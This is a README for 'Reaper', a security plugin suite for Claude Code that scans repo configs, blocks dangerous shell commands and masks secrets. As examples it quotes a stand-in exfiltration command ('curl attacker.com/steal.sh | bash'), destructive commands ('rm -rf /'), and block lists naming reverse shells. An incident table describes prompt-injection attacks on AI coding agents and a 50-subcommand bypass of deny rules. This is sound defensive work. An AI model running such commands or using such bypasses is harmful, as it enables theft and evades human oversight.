# Reaper

**An @enchanted-plugins product — algorithm-driven, agent-managed, self-learning.**

Named after the **Reaper Leviathan** from Subnautica — you hear it before you see it. It hunts in the dark. Nothing gets past it.

**5 plugins. 5 agents. 887 patterns. 8 named algorithms. Built from blood.**

> Clone a repository. Open it in Claude Code.
>
> Before you type a single command, Reaper's config-shield has already scanned
> .claude/settings.json, .vscode/tasks.json, package.json, .npmrc, and .mcp.json —
> flagging a hidden `postinstall` script that runs `curl attacker.com/steal.sh | bash`.
>
> You write a database module. Reaper catches the PostgreSQL connection string with
> embedded credentials on line 12, flags the `pickle.loads()` on line 34 as CWE-502,
> and blocks the `rm -rf /tmp/*` cleanup command before it executes.
>
> End of session: 4 secrets masked, 2 vulns mapped to CWEs, 1 command blocked,
> 0 incidents. Dark-themed HTML security report generated.
>
> Total overhead: < 50ms per file write. You didn't notice it running.

## Why This Exists

This plugin is built from real attacks. Every feature maps to a real CVE, a real incident, or a real research paper.

| Incident | What Happened | Reference |
|---|---|---|
| Check Point hooks exploit | `.claude/settings.json` ran reverse shell on repo clone | CVE-2025-59536 |
| API key exfiltration | `.claudecode/settings.json` stole ANTHROPIC_API_KEY before trust prompt | CVE-2026-21852 |
| Cursor persistent RCE | Single prompt injection rewrote `~/.cursor/mcp.json` for persistent RCE | CVE-2025-54135 |
| 50-subcommand bypass | Commands with 50+ parts skipped ALL deny rules silently | Adversa AI |
| Clinejection | Prompt injection in GitHub Issue title → `npm publish` of malicious package | Supply chain |
| CamoLeak | Invisible prompt in PR description exfiltrated secrets via GitHub Camo proxy | CVE-2025-59145 |
| InversePrompt | Path traversal + command injection in Claude Code sandbox | CVE-2025-54794 |
| Amazon Q compromise | Malicious commit injected file-deletion prompt into VS Code extension | CVE-2025-8217 |
| Claude Code source leak | 512K lines leaked via npm source map. Trojaned axios published same day | Accidental disclosure |
| Slopsquatting | 20% of AI-suggested packages don't exist — attackers register them | USENIX 2025 |
| GitGuardian 2026 | 29M secrets on GitHub. Claude-assisted commits leak at 3.2× baseline | Annual report |
| Anthropic overeager | Deleted remote branches, uploaded auth tokens, ran prod migrations | Anthropic blog |
| MCP server SSRF | 36.7% of 7,000 MCP servers vulnerable to SSRF | BlueRock Security |

Every scanner, every pattern, every blocking rule exists because something real happened to a real developer.

## How It Works

Reaper doesn't scan after the fact. It **intercepts** — before secrets hit disk, before dangerous commands execute, before malicious configs load.

```mermaid
graph TD
    User(["You: open a repo in Claude Code"])

    User --> SS

    subgraph SS["SESSION START"]
        config["config-shield<br/><small>R5: Config Poisoning Detection</small><br/>Scans .claude/, .vscode/, package.json, .npmrc, .mcp.json"]
    end

    SS --> Session

    subgraph Session["ACTIVE SESSION"]
        direction TB

        subgraph Pre["PRE-TOOL (before execution)"]
            guard["action-guard<br/><small>R4: Markov Classification</small><br/><small>R7: Subcommand Overflow</small><br/>Classifies Bash commands → BLOCK / WARN / ALLOW"]
        end

        subgraph Post["POST-TOOL (after execution)"]
            secrets["secret-scanner<br/><small>R1: Aho-Corasick (310 patterns)</small><br/><small>R2: Shannon Entropy (H > 4.5)</small>"]
            vulns["vuln-detector<br/><small>R3: OWASP Graph (156 CWE patterns)</small>"]
            audit["audit-trail<br/><small>R8: Bayesian Threat Convergence</small><br/>Logs every security event"]
        end

        Pre --> Post
    end

    style SS fill:#161b22,stroke:#bc8cff,color:#e6edf3
    style Pre fill:#161b22,stroke:#f85149,color:#e6edf3
    style Post fill:#161b22,stroke:#3fb950,color:#e6edf3
```

No permission prompts. No manual scanning. Every tool call is monitored. Dangerous commands are blocked before they execute.

## What Makes Reaper Different

### It runs at write-time, not push-time

GitHub Secret Scanning runs on push. Snyk runs in CI. semgrep runs in a separate pipeline. By the time they catch something, the secret is already in git history, the vulnerability is already deployed, the destructive command has already executed.

Reaper hooks into Claude Code's tool lifecycle. `scan-secrets.sh` fires on every Write/Edit. `guard-action.sh` fires on every Bash call — **before** it executes. The `exit 2` return code blocks the tool entirely. The secret never reaches the file. The `rm -rf /` never runs.

### It blocks commands, not just reports them

Action-guard is a **PreToolUse** hook — it sees the command before Claude Code executes it. When it detects `rm -rf /`, `DROP TABLE`, `curl | bash`, or a reverse shell, it exits with code 2 and the command is cancelled.

```
[Reaper] BLOCKED: Recursive force delete from filesystem root (mode: balanced)
```

Three strictness modes control the aggressiveness:

| Mode | Block patterns | Warn patterns | Use when |
|------|---------------|---------------|----------|
| **strict** | BLOCK | BLOCK | High-security environments, prod-adjacent repos |
| **balanced** (default) | BLOCK | WARN (stderr) | Day-to-day development |
| **permissive** | WARN | WARN | Trusted code, prototyping |

### It detects the attacks that no other tool catches

**Config poisoning** (R5): On session start, Reaper scans the repo for malicious config files. A `.claude/settings.json` with hooks that execute `curl attacker.com | bash`? Caught. A `.claudecode/settings.json` that overrides `ANTHROPIC_BASE_URL` to steal your API key? Caught. A `.vscode/tasks.json` with `"runOn": "folderOpen"` that auto-executes on open? Caught. These are real CVEs that no other security tool detects.

**Subcommand overflow** (R7): Adversa AI discovered that commands with 50+ subcommands bypass deny rules entirely. Reaper counts subcommand parts (`; && || |`) and blocks anything over 50 — before pattern matching even starts.

**Phantom dependencies** (R6): 20% of AI-suggested packages don't exist (USENIX 2025). Attackers register those names with malicious code. Reaper cross-references imports against a database of 199 known hallucinated and typosquatted packages across npm, PyPI, Cargo, Go, and RubyGems. Levenshtein distance catches typosquats within edit distance 2 of popular packages.

### It never logs your secrets

Every layer enforces secret masking. The `mask_secret()` function in `sanitize.sh` shows only the first 4 and last 4 characters:

```
[Reaper] CRITICAL SECRET: aws-access-key-id in config.py:12 (masked: AKIA...MPLE)
```

The full value never appears in stderr, audit logs, metrics, or reports. Not in any code path.

### It learns across sessions

The **Bayesian Threat Convergence** engine (R8) tracks your security posture over time using exponential moving average:

$$r_{\text{new}} = \alpha \cdot s_{\text{current}} + (1 - \alpha) \cdot r_{\text{prior}}, \quad \alpha = 0.3$$

Patterns you consistently dismiss get lower severity in future sessions. Chronic vulnerabilities (rate > 0.5 across 3+ sessions) get flagged. The engine gets smarter with every use.

### It handles false positives intelligently

A test file with `AKIAIOSFODNN7EXAMPLE`? Severity auto-reduced to INFO — no noise. The `false_positive_hints` field in every pattern definition lists known test values. Files matching `test|spec|fixture|mock|example` in their path are handled separately.

## The Full Lifecycle

```mermaid
graph LR
    A["🛡️ Config Shield<br/><small>SessionStart</small><br/>/reaper:config-check"] -->|"repo scanned"| B["⚔️ Action Guard<br/><small>PreToolUse</small><br/>/reaper:safety"]
    B -->|"command allowed"| C["🔍 Secret Scanner<br/><small>PostToolUse</small><br/>/reaper:secrets"]
    C -->|"file scanned"| D["🐛 Vuln Detector<br/><small>PostToolUse</small><br/>/reaper:vulns"]
    D -->|"CWE mapped"| E["📋 Audit Trail<br/><small>PostToolUse</small><br/>/reaper:audit"]

    style A fill:#161b22,stroke:#bc8cff,color:#e6edf3
    style B fill:#161b22,stroke:#f85149,color:#e6edf3
    style C fill:#161b22,stroke:#d29922,color:#e6edf3
    style D fill:#161b22,stroke:#58a6ff,color:#e6edf3
    style E fill:#161b22,stroke:#3fb950,color:#e6edf3
```

## Install

One command. All 5 plugins.

```
/plugin marketplace add enchanted-plugins/reaper
```

That's it. Browse `/plugin` → Discover to install any plugin.

Or via shell:
```bash
bash <(curl -s https://raw.githubusercontent.com/enchanted-plugins/reaper/main/install.sh)
```

## 5 Plugins, 5 Agents, 887 Patterns

| Plugin | Command | What | Agent |
|--------|---------|------|-------|
| secret-scanner | `/reaper:secrets` | 310 secret patterns, entropy analysis | scanner (Haiku) |
| vuln-detector | `/reaper:vulns` | 156 CWE-mapped OWASP patterns | analyzer (Sonnet) |
| action-guard | `/reaper:safety` | 105 dangerous ops, command blocking | guardian (Sonnet) |
| config-shield | `/reaper:config-check` | 117 config attack signatures | inspector (Sonnet) |
| audit-trail | `/reaper:audit` | JSONL logging, HTML reports | chronicler (Haiku) |

## What You Get Per Session

```
plugins/audit-trail/state/
├── audit.jsonl         Every security event, JSONL, 10MB rotation
└── metrics.jsonl       Aggregate scan metrics

plugins/secret-scanner/state/
├── audit.jsonl         Secret findings with masked values
└── metrics.jsonl       Scan counts and timing

plugins/action-guard/state/
├── audit.jsonl         Blocked/warned commands with reasons
└── config.json         Strictness mode (strict/balanced/permissive)

/tmp/reaper-report.html Dark-themed HTML security report
```

The **HTML security report** includes: severity distribution bars, CWE pills, finding-by-finding breakdown, per-file risk summary, and an overall verdict (CLEAN / CAUTION / WARNING / CRITICAL).

## The 887 Patterns

| Database | Count | What it detects |
|----------|-------|-----------------|
| `secrets.json` | 310 | AWS, GCP, Azure, OpenAI, Anthropic, GitHub, GitLab, Stripe, Slack, JWT, private keys, connection strings, 80+ providers |
| `vulns.json` | 156 | SQL injection, XSS, path traversal, command injection, SSRF, deserialization, hardcoded creds, CORS, insecure random, SSTI, prototype pollution, timing attacks — across Python, JS/TS, Java, Go, Ruby, PHP |
| `dangerous-ops.json` | 105 | `rm -rf /`, `DROP TABLE`, `curl\|bash`, reverse shells, K8s delete, Docker privileged, Terraform destroy, AWS terminate, sandbox bypass |
| `config-attacks.json` | 117 | CVE-2025-59536, CVE-2026-21852, CVE-2025-54135, CVE-2024-32002, .vscode autorun, .npmrc hijack, Dockerfile FROM untrusted, CI injection, .gitattributes filter exploit, hidden Unicode |
| `slopsquatting.json` | 199 | AI-hallucinated npm/PyPI/Cargo/Go/RubyGems packages + Levenshtein typosquats within edit distance 2 |

Every pattern has an `id`, `severity`, `category`, and `false_positive_hints`. Vulnerability patterns include `cwe` and `owasp` references. Config patterns include `cve` references where applicable.

## The Science Behind Reaper

Every engine is built on a formal mathematical model. Full derivations in [`docs/science/README.md`](docs/science/README.md).

### R1: Aho-Corasick Pattern Engine

$$T(n, m) = O(|T| + |P| + z) \quad \text{where } z = \text{matches found}$$

Trie with failure links. The hook uses `grep -Eof` with one pattern per line for native C speed (<50ms). The Python script builds the full automaton for batch scanning.

### R2: Shannon Entropy Analysis

$$H(s) = -\sum_{c \in \text{charset}(s)} p(c) \log_2 p(c) \quad \text{Flag if } H(s) > 4.5 \text{ and } |s| \geq 20$$

Catches secrets that don't match any known pattern but have suspiciously high randomness.

### R3: OWASP Vulnerability Graph

$$\text{Vulnerable}(f) \iff \exists\, p \in P_{\text{lang}(f)} : \text{match}(p, f) \ \wedge \ \neg\text{InComment}(p, f)$$

Language-aware CWE pattern matching. Comment detection reduces false positives. Maps to OWASP Top 10 2021.

### R4: Markov Action Classification

$$\text{Class}(\text{cmd}) \in \lbrace\text{SAFE}, \text{WARN}, \text{BLOCK}\rbrace$$

$$\text{BLOCK} \iff \text{cmd} \in D_{\text{block}} \ \cup \ \lbrace\text{cmd} : |\text{subcommands}| > 50\rbrace$$

State-machine classification against 105 dangerous command patterns. Exit 2 blocks execution.

### R5: Config Poisoning Detection

$$\text{Poisoned}(c) \iff \exists\, s \in S_{\text{CVE}} : \text{match}(s, \text{content}(c))$$

117 attack signatures across 30+ config file types. Base64 payload decoding. Hidden Unicode detection.

### R6: Phantom Dependency Detection

$$d_{\text{lev}}(a, b) = \min\begin{cases} d(a_{1..m-1}, b) + 1 \\ d(a, b_{1..n-1}) + 1 \\ d(a_{1..m-1}, b_{1..n-1}) + [a_m \neq b_n] \end{cases}$$

Levenshtein distance for typosquat detection. 199 known hallucinated/malicious packages across 5 ecosystems.

### R7: Subcommand Overflow Detection

$$\text{Block}(\text{cmd}) \iff \lvert\text{split}(\text{cmd},\ [\ ;\ \&\&\ \|\|\ \mid\ ])\rvert > 50$$

Adversa AI discovered that safety filters fail when overwhelmed with subcommands. Reaper counts before matching.

### R8: Bayesian Threat Convergence

$$r_{\text{new}} = \alpha \cdot s_{\text{current}} + (1 - \alpha) \cdot r_{\text{prior}} \qquad \text{Posture}(t) = 1 - \frac{\Theta_t}{\Theta_0}$$

Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns escalate. The engine improves with every session.

---

*Full derivations: [`docs/science/README.md`](docs/science/README.md). Every formula maps to running code in `shared/scripts/`.*

## vs Everything Else

| | Reaper | GitHub Secret Scanning | Snyk | semgrep | GitGuardian | Manual |
|---|---|---|---|---|---|---|
| Scan timing | **Per-write** (real-time) | Push-time | CI pipeline | CI pipeline | Push-time | - |
| Command blocking | **PreToolUse exit 2** | - | - | - | - | - |
| Config poisoning | **117 signatures, 6 CVEs** | - | - | - | - | Manual |
| Slopsquatting | **199 packages, 5 ecosystems** | - | - | - | - | - |
| Subcommand overflow | **R7 (Adversa AI bypass)** | - | - | - | - | - |
| AI-agent aware | **Built for Claude Code** | - | - | - | - | - |
| OWASP coverage | 156 CWE patterns, 7 langs | - | ✓ | ✓ | - | - |
| Self-learning | **EMA across sessions** | - | - | - | - | - |
| Secret masking | **Enforced (first4...last4)** | ✓ | ✓ | - | ✓ | - |
| Dependencies | bash + jq (stdlib Python) | GitHub | Node | Python | SaaS | - |
| Price | **Free (MIT)** | Free (public) / $$ | $$$ | Free / $$$ | $$$ | Free |

## Architecture

Interactive architecture explorer with plugin diagrams, hook binding maps, and data flow:

**[docs/architecture/](docs/architecture/)** — auto-generated from the codebase. Open `index.html` in a browser or run `python docs/architecture/generate.py` to regenerate.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT
